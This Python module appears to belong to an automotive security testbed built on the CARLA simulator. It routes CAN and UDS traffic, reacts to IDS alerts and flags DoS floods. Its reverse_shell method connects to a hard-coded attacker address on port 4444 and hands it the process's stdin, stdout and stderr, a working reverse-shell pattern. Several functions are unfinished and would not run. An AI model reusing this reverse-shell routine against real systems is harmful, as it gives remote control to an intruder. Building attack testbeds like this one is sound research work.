import os
import sys
import threading
import time
import queue
import can
import carla
import subprocess
import math
import re
import socket
import select

try:
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + '/carla')
except IndexError:
    pass

from invehicle_network.ivn.ivn import IVN
from invehicle_network.protocol.carla_can_control import CAN
from invehicle_network.protocol.uds_server import UDSServer
from invehicle_network.protocol.uds_client import UDSTester

from attacker.attack_tracker import AttackTracker
from attacker.attack_manager import attack_mgr

class Scenario:
    def __init__(self, stop_event, can_obj=None, ivn_instance=None):
        self.can_obj = can_obj if can_obj else CAN()
        self.ivn_instance = ivn_instance if ivn_instance else IVN.load_ivn_from_json("ivn.json")
        self.temp_queue_kcan4 = queue.Queue()
        self.temp_queue_vcan0 = queue.Queue()
        self.processing_interval = 3
        self.priority_queue_vcan0 = queue.PriorityQueue()
        self.priority_queue_kcan4 = queue.PriorityQueue()
        self.uds_queue = queue.Queue()
        self.listener_kcan4_thread = None
        self.listener_vcan0_thread = None
        self.udsserver_thread = None
        self.virtualshell_thread = None
        self.listener_virtualshell_thread = None
        self.kcan_fail_message_counter = 0  # Reset counter at the start
        self.vcan_fail_message_counter = 0
        self.kcan_start_time = time.monotonic()  # Initialize start time
        self.vcan_start_time = time.time()
        self.kcan_dos_threshold = 200
        self.vcan_dos_threshold = 200
        self.kcan_dos = False
        self.vcan_dos = False
        self.door_open = False
        self.door_count = 0
        self.tmp_door = False
        self.stop_event = stop_event
        self.attack_tracker = AttackTracker()
        self.attack_out_of_range = False
        #new add to detect flooding even when messages are valid IDs.
        self.kcan_msg_window_start = time.monotonic()
        self.kcan_msg_window_count = 0
        self.kcan_global_threshold = 1000   # msgs/sec threshold (tune as needed)
        self.cancontrol_flag = True
        self.ids_alert = False
        self.last_ids_time = None
    

    def setup_common_environment(self):
        print("---------- GATEWAY AND BUS LISTENING START -------------")
        gateway = IVN.find_service('transfer_can_message', self.ivn_instance)
        self.listener_kcan4_thread = threading.Thread(target=gateway.gateway_listener_kcan4, args=(self.stop_event, self.temp_queue_kcan4))
        self.listener_kcan4_thread.start()
        self.listener_vcan0_thread = threading.Thread(target=gateway.gateway_listener_vcan0, args=(self.stop_event, self.temp_queue_vcan0))
        self.listener_vcan0_thread.start()
        
        #self.setup_listener_threads(gateway)
        #return gateway
        
    def setup_common_environment_ids(self):
        self.listener_kcan4_thread = threading.Thread(target=gateway.gateway_listener_kcan4, args=[self.stop_event, self.temp_queue_kcan4])
        self.listener_kcan4_thread.start()
        time.sleep(1)

        self.listener_vcan0_thread = threading.Thread(target=gateway.gateway_listener_vcan0, args=[self.stop_event, self.temp_queue_vcan0])
        self.listener_vcan0_thread.start()
        time.sleep(1)
        
    def inspect_priority_queue(self):
        temp_items = []
        while not self.temp_queue_kcan4.empty():
            msg = self.temp_queue_kcan4.get()
            self.priority_queue_kcan4.put(msg)
            #print(f"Is can queue empty? {can_queue_kcan4.empty()}")

            #if self.priority_queue_kcan4.qsize() > 5:
            # Dequeue all items for inspection
        while not self.priority_queue_kcan4.empty():
            item = self.priority_queue_kcan4.get()
            temp_items.append(item)
        print(temp_items)

    def create_uds_hack_scenario(self, srv_tester, srv_server, control, vehicle, vehicledoor):
        print("------------------ UDS SERVER START -------------------")
        service_shell = IVN.find_service("virtual_shell", self.ivn_instance)
        #self.reverse_shell(service_shell, self.stop_event)
        service_tester = IVN.find_service(srv_tester, self.ivn_instance)
        service_server = IVN.find_service(srv_server, self.ivn_instance)
        if not service_tester or not service_server:
            print(f"Exception: Service '{service_tester}' or '{service_server}' not found.")
            return
        self.udsserver_thread= threading.Thread(target=service_tester.ecu_uds_server, args=(self.stop_event, control, vehicle, vehicledoor, self.attack_tracker, self))
        self.udsserver_thread.start()
        
    def create_dump_message_scenario(self, world):
        self.can_object = True
        self.can_obj.log_only = True
        #self.setup_common_environment()
        v = world.player.get_velocity()
        c = world.player.get_control()
        v_dump = 3.6 * math.sqrt(v.x**2 + v.y**2 + v.z**2)
        # Dump CAN message of throttle and brake
        self.can_obj.dump_throttle(c, v_dump)        
        # Dump CAN message of stearing
        self.can_obj.dump_steering(c, world.player, v_dump)        
        # Dump CAN message of gear
        self.can_obj.dump_gear(c)
        # Dump CAN messate of velocity
        self.can_obj.dump_wheelspeed(v_dump)
        # Dump CAN message of door
        self.can_obj.dump_door(world)
        # Dump CAN message of light
        self.can_obj.dump_light(world.player)        
        # Dump CAN message of handbrake
        self.can_obj.dump_handbrake(c, v_dump)
        #print(f"[DEBUG] Steer possition: {c.steer}, SteerFR: {int(world.player.get_wheel_steer_angle(carla.VehicleWheelLocation.FL_Wheel))}, SteerFL: {int(world.player.get_wheel_steer_angle(carla.VehicleWheelLocation.FR_Wheel))}")

    def listen_for_ids_alert(self):
        UDP_IP = "127.0.0.1"
        UDP_PORT = 5005
        print("[CARLA] Listening for IDS alerts on port 5005...")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((UDP_IP, UDP_PORT))
        
        while True:
            try:
                data, _ = sock.recvfrom(1024)
                msg = data.decode().strip()
                #print(f"[CARLA] IDS alert received: {msg}")
                self.ids_alert = True
                self.last_ids_time = time.time()
                # existing behaviour
                #self.cancontrol_flag = False

            except Exception as e:
                break
#        while True:
#           try:
#              data, _ = sock.recvfrom(1024)
#                msg = data.decode().strip()
#                #print(f"[CARLA] IDS alert received: {msg}")
#                self.cancontrol_flag = False
#            except Exception as e:
#                #print(f"[CARLA] IDS listener error: {e}")
#                break


    def process_kcan_messages(self, vehicle, vehiclecontrol):
        process_finish = True
        while not self.temp_queue_kcan4.empty() and process_finish == True:
            msg = self.temp_queue_kcan4.get()
            self.priority_queue_kcan4.put(msg)
            if (self.priority_queue_kcan4.qsize() > 5):
                process_finish = False            
        while not self.priority_queue_kcan4.empty():
            _, _, message = self.priority_queue_kcan4.get()
            if(self.priority_queue_kcan4.empty()):
                process_finish = True            
           
            can_id = message.arbitration_id
            if can_id == 0x24B: # Door
                doorflag = self.can_obj.control_door_seperate1(vehicle, message)
                if doorflag == 1 and self.tmp_door == False:
                    self.door_count += 1
                    #print(f"Door_count:{self.door_count}")
                    self.door_open = True
                    self.tmp_door = True
                if doorflag == 0 and self.tmp_door == True:
                    self.door_open = False
                    self.tmp_door = False
                pass
            elif can_id == 0x2F6: # Light
                self.can_obj.control_light_seperate(vehicle,message)
                pass
            elif can_id == 0x0CE: # Speedometer
                pass
            else:
                self.kcan_fail_message_counter += 1
                elapsed_time = time.monotonic() - self.kcan_start_time
                if elapsed_time > 30:
                    if self.kcan_fail_message_counter <= self.kcan_dos_threshold:
                        print(f"run counter {self.kcan_fail_message_counter}")
                        self.kcan_fail_message_counter = 0
                        self.kcan_start_time = time.monotonic()
                    else:
                        self.kcan_dos = True
                        vehiclecontrol.manual_gear_shift = False
                        vehiclecontrol.brake = 1
                        vehiclecontrol.gear = 0
                        vehiclecontrol.throttle = 0
            return vehiclecontrol

    
    def process_vcan_messages(self, vehicle, vehiclecontrol, cancontrol_flag):
        process_finish = True
        while not self.temp_queue_vcan0.empty() and process_finish == True:
            msg = self.temp_queue_vcan0.get()
            self.priority_queue_vcan0.put(msg)
            if (self.priority_queue_vcan0.qsize() > 5):
                process_finish = False
        while not self.priority_queue_vcan0.empty():
            _, _, message = self.priority_queue_vcan0.get()
            if(self.priority_queue_vcan0.empty()):
                process_finish = True   
                
            can_id = message.arbitration_id
            if can_id == 0x1A0: #Throttle, Brake, Forward, Backward
                if cancontrol_flag:
                    control = self.can_obj.control_enginedata_seperate(vehiclecontrol, message)
                    return control
                else:
                    print(f" The IDS detec attack with cancontrol_flag is {cancontrol_flag}. Return to planner control!")
                    pass           
            elif can_id == 0xC4: # Steering
                if cancontrol_flag:
                    control = self.can_obj.control_steering_seperate(vehicle, vehiclecontrol, message)
                    return control
                else:
                    print(f" The IDS detec attack with cancontrol_flag is {cancontrol_flag}. Return to planner control!")
                    pass
            elif can_id == 0xBA: # Gear
                if cancontrol_flag:
                    control = self.can_obj.control_gear_seperate(vehiclecontrol, message)
                    #print(f"Control is :{control}")
                    return control
                else:
                    print(f" The IDS detec attack with cancontrol_flag is {cancontrol_flag}. Return to planner control!")
                    pass
            elif can_id == 0x7E0: # UDS                
                pass
            else:
                self.vcan_fail_message_counter += 1
                elapsed_time = time.time() - self.vcan_start_time
                if elapsed_time > 30:
                    if self.vcan_fail_message_counter <= self.vcan_dos_threshold:
                        self.vcan_fail_message_counter = 0
                        self.vcan_start_time = time.time()
                    else:
                        self.vcan_dos = True
                        print("DOS attack detected on VCAN0")
                        vehiclecontrol.manual_gear_shift = False
                        vehiclecontrol.brake = 1
                        vehiclecontrol.gear = 0
                        vehiclecontrol.throttle = 0
                        return vehiclecontrol

    
    def reverse_shell(self, service_shell, stop_event):
        def attempt_connection():            
            attacker_ip = '192.168.175.201'
            attacker_port = 4444
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            s.setblocking(0)
            connected = False

            while not connected and not stop_event.is_set():        
                try:
                    print ("Try to connect")
                    s.connect((attacker_ip, attacker_port))
                    connected = True
                    s.setblocking(1)
                except (BlockingIOError, ConnectionRefusedError):
                    time.sleep(5)
                    continue
            if connected and not stop_event.is_set():
                print("HeadUnit hacked")
                self.attack_tracker.update_path("HeadUnit")
                self.attack_tracker.print_path()
                # Redirect stdin, stdout, and stderr to the socket
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                # Provide a shell
                self.virtualshell_thread = threading.Thread(target=service_shell.virtual_shell, args=(stop_event,))
                self.virtualshell_thread.start()
            else:
                print("Connection attempt stopped or failed.")            
        # Start the connection attempt in a separate thread
        self.listener_virtualshell_thread = threading.Thread(target=attempt_connection)
        self.listener_virtualshell_thread.start()                
          

    def get_door_count(self):
        service_tester = IVN.find_service("diag_service", self.ivn_instance)
        #self.door_count = service_tester.get_door_count()
        print(f"Door count scenario side: {self.door_count}")
        return self.door_count


   

    
#not used function------------------
#
#-----------------------------------

    def create_api_scenario(self, vehicle, srv_sender, srv_receiver):
        gateway = self.setup_common_environment()

        service_sender = IVN.find_service(srv_sender, self.ivn_instance)
        service_receiver = IVN.find_service(srv_receiver, self.ivn_instance)
        if not service_sender or not service_receiver:
            print(f"Exception: Service '{srv_sender}' or '{srv_receiver}' not found.")
            return

        if 'gateway' in service_sender.connection and 'ecu_sender' in service_sender.functionality:
            if service_sender.name == 'api_ctr':
                subprocess.run([
                    'gnome-terminal', '--',
                    'bash', '--init-file', 'init_script.sh'
                ])
            door_thread = threading.Thread(target=service_sender.ecu_receiver, args=(service_sender, can_queue_kcan4, self.can_obj, vehicle))
            door_thread.start()
        else:
            print(f"Exception: Service '{service_sender.name}' cannot send CAN messages.")
            return

    def settup_ecu_receive(self, vehicle):
        throttle = IVN.find_service('throttle_ctr_on_can_message', self.ivn_instance)
        throttle.gateway_manage(self.can_obj, can_queue_vcan0, vehicle)

    def create_can_hack_scenario(self, vehicle):
        print("This function is used to do the hack using can message")
        gateway = self.setup_common_environment()


    # WORK IN PROGRESS
    #Some example input:
    #Control door: 0000024b#0100010001000100
    #Control light: 000002f6#0000010000000000
    def create_message_control_scenario(self, vehicle):
        # Take user input
        user_command = input("Please enter your CAN command like 000001A0#09011BF0001BE00F: ")
        if self.is_valid_command(user_command):
            can_id, can_data_hex = user_command.split('#')
            can_id_int = int(can_id, 16)
            can_data = [int(can_data_hex[i:i+2], 16) for i in range(0, len(can_data_hex), 2)]
            command = ''
            print(f"Executing: CAN ID = {can_id}, CAN Data = {can_data}")
            if can_id_int == 0x2F6:  # Replace with the actual CAN ID for door open
                self.can_obj.control_light_seperate(vehicle, message)
            elif can_id_int == 0x24B:
                self.can_obj.control_door_seperate(vehicle, message)
            else:
                Print(f"Invalid CAN-ID")
        else:
            print("Invalid command. The input should be like 000001A0#09011BF0001BE00F")


    def is_valid_command(self, user_command):
        # Regular expression to match CANID#DATA pattern
        pattern = re.compile(r'^[0-9A-Fa-f]{8}#[0-9A-Fa-f]+$')
        return bool(pattern.match(user_command))

if __name__ == "__main__":
    scenario = Scenario()
    #scenario.create_uds_hack_scenario("diag_service","handle_uds_message")
